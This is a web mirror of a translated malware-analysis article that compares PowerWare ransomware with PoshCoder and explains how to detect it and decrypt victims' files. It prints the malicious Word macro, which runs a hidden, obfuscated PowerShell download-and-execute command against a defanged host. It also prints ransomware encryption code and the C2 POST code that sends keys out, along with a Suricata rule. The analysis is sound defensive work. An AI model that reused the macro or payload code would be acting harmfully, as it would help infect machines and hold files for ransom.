<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Powerware or PoshCoder? Comparison and decryption</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="PowerWare is downloaded using Microsoft Word with a macro-enabled document and distributed using phishing spam mailing. 

 The malicious document atte...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Powerware or PoshCoder? Comparison and decryption</h1><div class="post__text post__text-html js-mediator-article">  PowerWare is downloaded using Microsoft Word with a macro-enabled document and distributed using phishing spam mailing. <br><br>  The malicious document attempts to convince the user to include macros, telling them that the file is protected by Microsoft Office.  This is of course a farce.  Once the macro is enabled, the PowerWare ransomware will be downloaded and executed.  This extortionist is mainly aimed at medical institutions in the United States.  Slightly deviating from the topic, I want to note how well it is still that our good medical card is used in our medical facilities. <br><br><img src="https://habrastorage.org/files/910/d09/1d5/910d091d5388431db5025d32f64c8b9d.jpg"><a name="habracut"></a><h6>  Screenshot of a malicious Microsoft Word document. </h6><br>  Using <code>olevba.py</code> from <code>oletools</code> , we can extract a macro from the above document for analysis. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="bash hljs">Private Sub Document_Open() Dim CGJKIYRSDGHJHGFFG As String CGJKIYRSDGHJHGFFG = <span class="hljs-string"><span class="hljs-string">"cmd /K "</span></span> + <span class="hljs-string"><span class="hljs-string">"pow"</span></span> + <span class="hljs-string"><span class="hljs-string">"eR"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"sh"</span></span> + <span class="hljs-string"><span class="hljs-string">"ell.e"</span></span> + <span class="hljs-string"><span class="hljs-string">"x"</span></span> + <span class="hljs-string"><span class="hljs-string">"e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object System.Net.WebClient).DownloadFile('http://skycpa[.]in/file.php','%TEMP%\Y.ps1'); poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile -file %TEMP%\Y.ps1"</span></span> Shell CGJKIYRSDGHJHGFFG, 0 MsgBox (<span class="hljs-string"><span class="hljs-string">"Unreferenced library required"</span></span>) End Sub</code> </pre><br>  In the output above, we see that the macro intends to execute the following PowerShell command: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"cmd /K "</span></span> + <span class="hljs-string"><span class="hljs-string">"pow"</span></span> + <span class="hljs-string"><span class="hljs-string">"eR"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"sh"</span></span> + <span class="hljs-string"><span class="hljs-string">"ell.e"</span></span> + <span class="hljs-string"><span class="hljs-string">"x"</span></span> + <span class="hljs-string"><span class="hljs-string">"e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object System.Net.WebClient).DownloadFile('http://skycpa.in/file[.]php','%TEMP%\Y.ps1'); poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile -file %TEMP%\Y.ps1‚Äù</span></span></code> </pre><br>  The extortioner uses the <code>cmd.exe</code> file to start <code>powershell.exe</code> , since on some systems the direct invocation of the executable file is blocked.  The command also introduces a little confusion, such as splitting <code>powershell.exe</code> into bits-sized blocks and mixing upper and lower case.  In addition, the command attempts to bypass the execution policy and not use any profiles set by the system for use by default.  After that, it loads the <code>syscpa[.]</code> Payload form into a temporary directory such as Y.ps1, and then starts its execution. <br><br><h4>  Powerware based PoshCoder </h4><br>  When analyzing the PowerShell file that was loaded, you may notice that the programming logic looks familiar.  PowerWare is largely based on PoshCoder, another extortionist, who was considered the meanest because he destroyed the encrypted files due to errors in the programming logic.  The programming style and sequence of actions are quite similar, some even claim that this is one of the variants of PoshCoder, and not a completely new family of ransomware PowerShell.  The following are some of the main similarities: <br><br>  1. Both include the use of the <code>RijndaelManaged</code> class.  But using this class is not uncommon.  However, if you pay attention to the use of the class, you will notice that these two are quite similar to each other, ranging from key initialization to mode selection and addition. <br><br><pre> <code class="bash hljs"><span class="hljs-variable"><span class="hljs-variable">$XlowQsiRsKORgfR</span></span> = new-Object System.Security.Cryptography.RijndaelManaged <span class="hljs-variable"><span class="hljs-variable">$XlowQsiRsKORgfR</span></span>.Key = (new-Object Security.Cryptography.Rfc2898DeriveBytes <span class="hljs-variable"><span class="hljs-variable">$BchjdRgasjcThsjd</span></span>, <span class="hljs-variable"><span class="hljs-variable">$UxjcRgasjfvRsj</span></span>, 5).GetBytes(32) <span class="hljs-variable"><span class="hljs-variable">$XlowQsiRsKORgfR</span></span>.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes(<span class="hljs-string"><span class="hljs-string">"XlowQsiRsKORgfRjBMPLmCamEMyFRlWfsgTgh"</span></span>) )[0..15] <span class="hljs-variable"><span class="hljs-variable">$XlowQsiRsKORgfR</span></span>.Padding=<span class="hljs-string"><span class="hljs-string">"Zeros"</span></span> <span class="hljs-variable"><span class="hljs-variable">$XlowQsiRsKORgfR</span></span>.Mode=<span class="hljs-string"><span class="hljs-string">"CBC"</span></span></code> </pre><h6>  Sample from PoshCoder </h6><br><pre> <code class="bash hljs">Bnx8Khahs3Hjx96 = new-Object System.Security.Cryptography.RijndaelManaged <span class="hljs-variable"><span class="hljs-variable">$Bnx8Khahs3Hjx96</span></span>.Key = (new-Object Security.Cryptography.Rfc2898DeriveBytes <span class="hljs-variable"><span class="hljs-variable">$GBCSWHJKIYRDVHH</span></span>, <span class="hljs-variable"><span class="hljs-variable">$VGHKJJGFERHJJGSDQWD</span></span>, 5).GetBytes(32) <span class="hljs-variable"><span class="hljs-variable">$Bnx8Khahs3Hjx96</span></span>.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes(<span class="hljs-string"><span class="hljs-string">"alle"</span></span>) )[0..15] <span class="hljs-variable"><span class="hljs-variable">$Bnx8Khahs3Hjx96</span></span>.Padding=<span class="hljs-string"><span class="hljs-string">"Zeros"</span></span> <span class="hljs-variable"><span class="hljs-variable">$Bnx8Khahs3Hjx96</span></span>.Mode=<span class="hljs-string"><span class="hljs-string">"CBC"</span></span></code> </pre><h6>  PowerWare Sample </h6><br>  2. If you count all types of files that they encrypt, which are not shown here, so as not to litter the place, you will get a value of 451 file types.  Of these 451, most are found in both samples, with the exception of five types, <code>.amf</code> , <code>.qtiq</code> , <code>.srf</code> , <code>.val</code> and <code>.waw</code> .  The difference between the two samples is less than 1%. <br><br>  These two samples are not exact copies of each other, there are some differences in the code base, which you will see below. <br><br>  PoshCoder's peculiarity is the use of hard-coded values ‚Äã‚Äãto encrypt files.  PowerWare, on the other hand, uses a <a href="https://technet.microsoft.com/en-us/library/ff730929.aspx">Get-Random Cmdlet</a> to randomly generate values ‚Äã‚Äãto create a password and a salt (modifier) ‚Äã‚Äãfor RijndaelManaged. <br><br><pre> <code class="bash hljs"><span class="hljs-variable"><span class="hljs-variable">$GBCSWHJKIYRDVHH</span></span> = ([ChaR[]](GeT-RandOm -Input $(48..57 + 65..90 + 97..122) -Count 50)) -join <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-variable"><span class="hljs-variable">$SGKPOTTHJMNFDRYJKJ</span></span> = ([ChaR[]](GeT-RandOm -Input $(48..57 + 65..90 + 97..122) -Count 20)) -join <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-variable"><span class="hljs-variable">$SQEGJJYRFBNHFFHJ</span></span> = ([ChaR[]](GeT-RandOm -Input $(48..57 + 65..90 + 97..122) -Count 25)) -join <span class="hljs-string"><span class="hljs-string">""</span></span></code> </pre><h6>  PowerWare Sample </h6><br>  PoshCoder does not include any type of network communications.  It simply sends randomly generated values ‚Äã‚Äãto the remote server via a POST request to HTTP using XMLHTTP. <br><br><pre> <code class="bash hljs"><span class="hljs-variable"><span class="hljs-variable">$73848HhjhdRghx67Hhsh</span></span> = New-Object -ComObject MsXml2.XMLHTTP <span class="hljs-variable"><span class="hljs-variable">$73848HhjhdRghx67Hhsh</span></span>.open(<span class="hljs-string"><span class="hljs-string">'POST'</span></span>, <span class="hljs-variable"><span class="hljs-variable">$XCJHEDIJGDFJMVD</span></span>, <span class="hljs-variable"><span class="hljs-variable">$false</span></span>) <span class="hljs-variable"><span class="hljs-variable">$73848HhjhdRghx67Hhsh</span></span>.setRequestHeader(<span class="hljs-string"><span class="hljs-string">"C"</span></span>+<span class="hljs-string"><span class="hljs-string">"ontent-tYpe"</span></span>, <span class="hljs-string"><span class="hljs-string">"apPlicAtion/x-www-form-url"</span></span>+<span class="hljs-string"><span class="hljs-string">"enCodeD"</span></span>) <span class="hljs-variable"><span class="hljs-variable">$73848HhjhdRghx67Hhsh</span></span>.setRequestHeader(<span class="hljs-string"><span class="hljs-string">"ConteNt-length"</span></span>, <span class="hljs-variable"><span class="hljs-variable">$post</span></span>.length) <span class="hljs-variable"><span class="hljs-variable">$73848HhjhdRghx67Hhsh</span></span>.setRequestHeader(<span class="hljs-string"><span class="hljs-string">"CoNNeCtion"</span></span>, <span class="hljs-string"><span class="hljs-string">"close"</span></span>) <span class="hljs-variable"><span class="hljs-variable">$73848HhjhdRghx67Hhsh</span></span>.send(<span class="hljs-variable"><span class="hljs-variable">$HGJHBVSRYUJNBGDRHJ</span></span>)</code> </pre><br>  3. PoshCoder variants have signs of poor programming and therefore some of the encrypted files may not be recoverable.  In particular, the scripts indicate that any file whose size is less than 42871 bytes will be fully encrypted, but in the case of large files only the first 42871 bytes are encrypted.  This is a problem because the encryption will read the first 42871 bytes of the file, encrypt them, and then add another 16 bytes of padding to achieve the next trait.  Due to the addition, overwritten bytes from 42872 to 42880 cannot be recovered.  There was also a problem with the AES key, not being properly summed up when converting to the <code>base64</code> string at the time of decryption, the variable would contain <code>NULL</code> or an empty value.  Fortunately, PowerWare does not seem to have these problems, and the files can be recovered normally. <br><br><h4>  PowerWare decryption </h4><br>  As noted earlier, PowerWare sends the randomly generated values ‚Äã‚Äãto the remote server in clear text via a POST request using XMLHTTP.  This makes traffic easily decrypted using <a href="https://www.alienvault.com/products">AlienVault USM</a> or another NIDS with the proper Suricata rule: <br><br><pre> <code class="bash hljs">alert http <span class="hljs-variable"><span class="hljs-variable">$HOME_NET</span></span> any -&gt; <span class="hljs-variable"><span class="hljs-variable">$EXTERNAL_NET</span></span> any (msg:<span class="hljs-string"><span class="hljs-string">"AV TROJAN Ransomware PowerWare/Poshcoder CnC Checkin"</span></span>; flow:established,to_server; content:<span class="hljs-string"><span class="hljs-string">"POST"</span></span>; http_method; content:<span class="hljs-string"><span class="hljs-string">"Content-Type|3a| application/x-www-form-urlencoded"</span></span>; http_header; nocase; content:<span class="hljs-string"><span class="hljs-string">".php"</span></span>; http_uri; content:<span class="hljs-string"><span class="hljs-string">"string="</span></span>; http_client_body; nocase; content:<span class="hljs-string"><span class="hljs-string">"&amp;string2="</span></span>; http_client_body; nocase; content:<span class="hljs-string"><span class="hljs-string">"&amp;uuid="</span></span>; http_client_body; nocase; reference:md5,4564d49eda7a048f301b1f87f9da3c62; classtype:trojan-activity; sid:12345678; rev:1;)</code> </pre><br>  Which, in theory, would receive traffic in the same form as shown in the screenshot below: <br><br><img src="https://habrastorage.org/files/713/224/1ad/7132241ad5e9430c95878255247c298e.png"><br><br>  To decrypt files, you will need: <br><br><ol><li>  Password used during encryption (string) </li><li>  Salt used in the encryption process (string2). </li></ol><br>  Using the values ‚Äã‚Äãof <code>string</code> and <code>string2</code> you can decrypt files encrypted using PowerWare. <br><br><pre> <code class="bash hljs">param([string]<span class="hljs-variable"><span class="hljs-variable">$filename</span></span> = $(Throw <span class="hljs-string"><span class="hljs-string">"Argument 'filename' required."</span></span>), [string]<span class="hljs-variable"><span class="hljs-variable">$string1</span></span> = $(Throw <span class="hljs-string"><span class="hljs-string">"Please enter 'string'."</span></span>),[string]<span class="hljs-variable"><span class="hljs-variable">$string2</span></span> = $(Throw <span class="hljs-string"><span class="hljs-string">"Please enter 'string2'."</span></span>)) write-host <span class="hljs-string"><span class="hljs-string">"The entered filename is: </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$filename</span></span></span><span class="hljs-string">"</span></span> write-host <span class="hljs-string"><span class="hljs-string">"The entered Password is: </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$string1</span></span></span><span class="hljs-string">"</span></span> write-host <span class="hljs-string"><span class="hljs-string">"The entered Salt is: </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$string2</span></span></span><span class="hljs-string">"</span></span> <span class="hljs-variable"><span class="hljs-variable">$salt</span></span> = [Text.Encoding]::UTF8.GetBytes(<span class="hljs-variable"><span class="hljs-variable">$string2</span></span>) <span class="hljs-variable"><span class="hljs-variable">$Rijndael</span></span> = new-Object System.Security.Cryptography.RijndaelManaged <span class="hljs-variable"><span class="hljs-variable">$Rijndael</span></span>.Key = (new-Object Security.Cryptography.Rfc2898DeriveBytes <span class="hljs-variable"><span class="hljs-variable">$string1</span></span>, <span class="hljs-variable"><span class="hljs-variable">$salt</span></span>, 5).GetBytes(32) <span class="hljs-variable"><span class="hljs-variable">$Rijndael</span></span>.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes(<span class="hljs-string"><span class="hljs-string">"alle"</span></span>) )[0..15] <span class="hljs-variable"><span class="hljs-variable">$Rijndael</span></span>.Padding=<span class="hljs-string"><span class="hljs-string">"Zeros"</span></span> <span class="hljs-variable"><span class="hljs-variable">$Rijndael</span></span>.Mode=<span class="hljs-string"><span class="hljs-string">"CBC"</span></span> try{ <span class="hljs-variable"><span class="hljs-variable">$binReader</span></span> = New-Object System.IO.BinaryReader([System.IO.File]::Open(<span class="hljs-variable"><span class="hljs-variable">$filename</span></span>, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::Read),[System.Text.Encoding]::ASCII) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-variable"><span class="hljs-variable">$binReader</span></span>.BaseStream.Length -lt 2048){ <span class="hljs-variable"><span class="hljs-variable">$binReader_length</span></span> = <span class="hljs-variable"><span class="hljs-variable">$binReader</span></span>.BaseStream.Length } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-variable"><span class="hljs-variable">$binReader_length</span></span> = 2048 } <span class="hljs-variable"><span class="hljs-variable">$data</span></span> = <span class="hljs-variable"><span class="hljs-variable">$binReader</span></span>.ReadBytes(<span class="hljs-variable"><span class="hljs-variable">$binReader_length</span></span>) <span class="hljs-variable"><span class="hljs-variable">$binReader</span></span>.Close() <span class="hljs-variable"><span class="hljs-variable">$The_Decryptor</span></span> = <span class="hljs-variable"><span class="hljs-variable">$Rijndael</span></span>.CreateDecryptor() <span class="hljs-variable"><span class="hljs-variable">$memStream</span></span> = new-Object IO.MemoryStream <span class="hljs-variable"><span class="hljs-variable">$cryptoStream</span></span> = new-Object Security.Cryptography.CryptoStream <span class="hljs-variable"><span class="hljs-variable">$memStream</span></span>,<span class="hljs-variable"><span class="hljs-variable">$The_Decryptor</span></span>,<span class="hljs-string"><span class="hljs-string">"Write"</span></span> <span class="hljs-variable"><span class="hljs-variable">$cryptoStream</span></span>.Write(<span class="hljs-variable"><span class="hljs-variable">$data</span></span>, 0,<span class="hljs-variable"><span class="hljs-variable">$data</span></span>.Length) <span class="hljs-variable"><span class="hljs-variable">$cryptoStream</span></span>.Close() <span class="hljs-variable"><span class="hljs-variable">$memStream</span></span>.Close() <span class="hljs-variable"><span class="hljs-variable">$The_Decryptor</span></span>.Clear() <span class="hljs-variable"><span class="hljs-variable">$memStream_Array</span></span> = <span class="hljs-variable"><span class="hljs-variable">$memStream</span></span>.ToArray() <span class="hljs-variable"><span class="hljs-variable">$binWriter</span></span> = New-Object System.IO.BinaryWriter([System.IO.File]::Open(<span class="hljs-variable"><span class="hljs-variable">$filename</span></span>, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::Read),[System.Text.Encoding]::ASCII) <span class="hljs-variable"><span class="hljs-variable">$binWriter</span></span>.Write(<span class="hljs-variable"><span class="hljs-variable">$memStream_Array</span></span>,0,<span class="hljs-variable"><span class="hljs-variable">$memStream_Array</span></span>.Length) <span class="hljs-variable"><span class="hljs-variable">$binWriter</span></span>.Close() } catch { write-host <span class="hljs-string"><span class="hljs-string">"Someting broke, set debuggers to level 10"</span></span> }</code> </pre><br>  Analyzed samples: <br><br>  4564d49eda7a048f301b1f87f9da3c62 - PowerWare <br>  627e107a62bdf541ffcfaa045fe9ba32 - PoshCoder / PoshKoder <br>  9fe45fc4c402932248cd2c26b65f883d - PoshCoder / PoshKoder <br>  be03eb109cab04a1a70b5bbc7b22949e - PoshCoder / PoshKoder <br>  d09cef5f16b1e5813a25fef43474ac96 - PoshCoder / PoshKoder <br><br>  While PowerWare seems like a new family of extortionists, for the most part it is based on PoshCoder.  For a clearer understanding, it takes much more time to analyze PowerWare, but we hope this kind of analysis will help security researchers in their efforts. </div><p>Source: <a href="https://habr.com/ru/post/282503/">https://habr.com/ru/post/282503/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../282493/index.html">Communications in store-and-forward mode, UUCP</a></li>
<li><a href="../282499/index.html">QFont and device independent font size</a></li>
<li><a href="../2825/index.html">All the same iphone</a></li>
<li><a href="../28250/index.html">Ayhuilko</a></li>
<li><a href="../282501/index.html">Russian Code Cup 2016: for the first time in English</a></li>
<li><a href="../282505/index.html">Qt Quick Controls 2 - have been waiting for the promised three years</a></li>
<li><a href="../282507/index.html">Memo for the office sysadmin</a></li>
<li><a href="../282509/index.html">Pain and animation tables for iOS. Awesome Table Animation Calculator Framework</a></li>
<li><a href="../28251/index.html">The idea can only be believed. About rational and irrational in startups</a></li>
<li><a href="../282511/index.html">All that wanted</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>